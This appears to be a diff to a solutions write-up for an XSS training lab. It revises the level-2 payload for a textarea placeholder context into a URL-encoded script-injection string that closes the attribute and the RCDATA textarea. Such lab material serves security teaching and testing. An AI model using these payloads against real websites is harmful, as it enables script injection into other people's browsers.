@@ -11,10 +11,10 @@ Reflection inside various form-element attributes (`placeholder`, `title`, `name
 
 ### formelement-level2
 
-`/formelement/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`
+`/formelement/level2/?query=%22%3E%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E`
 
-- payload: `"><script>alert(1)</script>`
-- context: `<textarea placeholder="...">` — close attr and tag
+- payload: `"></textarea><script>alert(1)</script>`
+- context: `<textarea placeholder="...">` — close the attribute and the RCDATA textarea
 
 ### formelement-level3
 
